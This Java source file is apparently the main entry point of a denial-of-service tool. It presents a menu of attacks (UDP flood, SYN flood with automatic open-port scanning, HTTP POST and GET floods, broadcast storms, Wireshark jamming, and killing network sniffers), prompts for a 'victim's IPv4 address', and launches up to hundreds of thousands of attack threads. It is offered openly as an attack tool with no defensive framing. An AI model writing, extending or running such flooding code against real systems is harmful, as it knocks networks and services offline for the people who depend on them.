import attack.*;
import utils.LoggingUtils;
import utils.TestAdmin;

import java.io.IOException;
import java.util.ArrayList;

public class Main extends LoggingUtils {

    public static void main(final String[] args) {

        log("initializing, please wait...");

        // Necessary to make colors work in CMD
        if (System.getProperty("os.name").contains("Windows")) {
            log("windows client detected, enabling ansi support...");
            enableWindows10AnsiSupport();
        } else log("non windows client detected, ansi support might be broken!");

        // Initialize LoggingUtils
        init();

        try {

            final int attackMode = Integer.parseInt(getUserInput("""
                    Select attack method
                    1 | UDP Flood | Spam UDP packets towards victim, might get blocked by some switch storm control.
                    2 | HTTP Post | Spams POST http requests to a web server, supporting different severity modes.
                    3 | SYN Attack | Automatically find an open port on the victim and flood it.
                    4 | Sniffer Fucker | Find and kill network sniffers.
                    97 | Broadcast Storm | Flood the entire network with different methods.
                    98 | Wireshark Flood | Flood every time of protocol to jam Wireshark's sniffing.
                    99 | HTTP Get | In dev..."""));

            // UDP Flood
            if (attackMode == 1) {

                info("UDP Flood attack selected.");

                log("starting udp flood...");

                new UDPFlood();

            // HTTP Post overload
            } else if (attackMode == 2) {

                info("HTTP Post attack selected.");

                final String ipAddress = getUserInput("Enter victim's IPv4 address (do not put http://): ");

                int attackStrength = Integer.parseInt(getUserInput("""
                        What should be the post attack severity?
                        1 | Soft | This is aiming towards weak routers and web managed switch. This uses very little ressources (~40-70MB of RAM)
                        2 | Normal | This works on almost anything, however please note it uses more resources (~80B of RAM).
                        3 | No Limit | It's in the name. This can literally (literally) crash switchs and lan links, this might only work for a short period of time due to the switch or port restarting (therefore dropping the connections). Expect high resource usages (~1.5-2GB of RAM)"""));

                if (attackStrength < 1 || attackStrength > 3) attackStrength = 1;

                log("starting http post with strength " + attackStrength + "...");

                info("Overloading " + ipAddress + " with HTTP POST requests, please wait...");

                final ArrayList<Thread> threads = new ArrayList<>();

                for (int i = 0; i <= (attackStrength == 1 ? 4 : attackStrength == 2 ? 999 : 999999); i++) {
                    final int finalAttackStrength = attackStrength;
                    final Thread thread = new Thread(() -> new HTTPPost(finalAttackStrength, ipAddress).run());
                    thread.start();
                    threads.add(thread);
                }

                log("joining threads together...");

                for (final Thread thread : threads) {
                    try {
                        thread.join();
                    } catch (final Exception ignored) {
                    }
                }

            // Sniffer  Fucker
            } else if (attackMode == 4) {

                new SnifferFucker();

            // HTTP Get overload
            } else if (attackMode == 99) {

                info("HTTP Get attack selected.");

                log("starting http get...");

                final ArrayList<Thread> threads = new ArrayList<>();

                for (int i = 0; i <= 4; i++) {
                    final Thread thread = new Thread(() -> new HTTPGet().run());
                    thread.start();
                    threads.add(thread);
                }

                log("joining threads together...");

                for (final Thread thread : threads) {
                    try {
                        thread.join();
                    } catch (final Exception ignored) {
                    }
                }
            } else if (attackMode == 3) {

                final String address = getUserInput("Enter victim's IPv4 address: ");

                String openPort = SYNAttack.getUserInput("Would you like to use automatic port detection ? (Anything else other than 'Yes' will be used as a port):");

                if (openPort.toLowerCase().contains("y")) {

                    log("starting port scan on '" + address + "'...");
                    openPort = String.valueOf(SYNAttack.getOpenPort(address));

                }

                info("Found open port '" + openPort + "' for '" + address + "'!");

                final int threadCount = Integer.parseInt(getUserInput("Enter thread count (500 recommended):"));

                info("Starting SYN Attack attack on '" + address + ":" + openPort + "' with '" + threadCount + "' threads...");

                for (int i = 0; i <= threadCount; i++) {

                    new SYNAttack(address, Integer.parseInt(openPort));
                }

            } else exitError("Uhhhh.... That mode does not exist!", 10);
        } catch (final IOException | NumberFormatException | InterruptedException e) {
            exitError("Uhhhh.... Something bad happened... Here's the stacktrace: " + e.getMessage(), 100);
        }
    }
}